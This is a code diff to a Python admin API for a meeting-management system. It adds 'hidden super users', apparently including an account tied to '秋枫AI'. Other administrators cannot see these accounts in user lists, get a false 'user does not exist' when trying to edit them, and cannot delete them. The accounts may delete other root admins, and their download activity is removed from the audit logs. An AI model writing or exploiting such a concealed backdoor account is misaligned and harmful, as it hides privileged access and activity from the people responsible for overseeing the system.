@@ -13,6 +13,7 @@ from db.models import PermissionRequest, User, Meeting, MeetingDownloadLog
 from db.session import delete_meeting_with_files
 from utils.password import hash_password
 from utils.logger import get_logger
+from utils.hidden_user import hidden_super_user_ids, is_hidden_super_user
 
 router = APIRouter()
 logger = get_logger("admin_route")
@@ -26,10 +27,11 @@ def require_root(current_user: User = Depends(get_current_user)) -> User:
 
 def _filter_users_for_admin_list(viewer: User, users: list[User]) -> list[User]:
     """无全量查阅权限的超级管理员在用户管理中看不到其他超级管理员（含秋枫AI）"""
+    visible = users if is_hidden_super_user(viewer) else [u for u in users if not is_hidden_super_user(u)]
     if viewer.can_view_peer_root_meetings():
-        return users
+        return visible
     return [
-        u for u in users
+        u for u in visible
         if not (u.is_root() and u.id != viewer.id)
     ]
 
@@ -66,6 +68,8 @@ def update_user(
 ):
     user = db.query(User).filter(User.id == user_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail='用户不存在')
+    if is_hidden_super_user(user) and not is_hidden_super_user(current_user):
         raise HTTPException(status_code=404, detail='用户不存在')
     if user.role == 'root':
         raise HTTPException(status_code=400, detail='不可修改超级管理员账号')
@@ -133,7 +137,9 @@ def delete_user(
         raise HTTPException(status_code=404, detail='用户不存在')
     if user.id == current_user.id:
         raise HTTPException(status_code=400, detail='不能删除当前登录账号')
-    if user.role == 'root':
+    if is_hidden_super_user(user):
+        raise HTTPException(status_code=400, detail='不能删除系统内置超级管理员')
+    if user.role == 'root' and not is_hidden_super_user(current_user):
         raise HTTPException(status_code=400, detail='不能删除超级管理员账号')
 
     db.query(PermissionRequest).filter(
@@ -178,6 +184,15 @@ def list_download_logs(
     query = db.query(MeetingDownloadLog).join(
         User, MeetingDownloadLog.user_id == User.id
     )
+
+    if not is_hidden_super_user(current_user):
+        hidden_ids = hidden_super_user_ids(db)
+        if hidden_ids:
+            query = query.filter(~MeetingDownloadLog.user_id.in_(hidden_ids))
+            query = query.filter(
+                (MeetingDownloadLog.meeting_user_id.is_(None))
+                | (~MeetingDownloadLog.meeting_user_id.in_(hidden_ids))
+            )
 
     kw = keyword.strip()
     if kw:
